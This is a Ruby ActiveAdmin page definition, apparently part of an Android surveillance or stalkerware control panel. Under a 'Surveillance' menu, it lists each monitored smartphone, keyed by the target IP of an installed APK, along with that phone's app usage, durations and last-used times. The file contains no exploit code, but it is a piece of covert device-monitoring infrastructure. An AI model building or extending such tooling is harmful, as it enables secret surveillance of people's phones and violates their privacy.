ActiveAdmin.register_page "App Usage" do
  menu parent: "👁 Surveillance", priority: 9, label: "📊 App Usage"

  content do
    div class: "app-usage-page", style: "padding: 20px; background: #161b22; min-height: 80vh;" do
      h2 "📊 App Usage Statistics", style: "color: #00ff41; margin-bottom: 20px;"

      smartphones = Smartphone.all
      smartphones.each do |device|
        device_id = device.apk_installation&.target_ip || device.id.to_s
        data = Rails.cache.read("app_usage:#{device_id}") rescue nil

        panel "📱 #{device.name || device_id}", style: "background: #0d1117; border: 1px solid #30363d;" do
          if data && data[:app_usage].present?
            table_for data[:app_usage].first(30) do |t|
              t.column("App") { |app| app["package_name"] || app[:package_name] }
              t.column("Usage") { |app| app["total_time_readable"] || app[:total_time_readable] }
              t.column("Last Used") { |app| 
                ts = app["last_used"] || app[:last_used]
                ts ? Time.at(ts.to_i / 1000).strftime("%Y-%m-%d %H:%M") : "N/A"
              }
            end
            para "Updated: #{data[:received_at]}", style: "color: #666; font-size: 12px;"
          else
            para "No app usage data available yet.", style: "color: #666; font-style: italic;"
          end
        end
      end
    end
  end
end
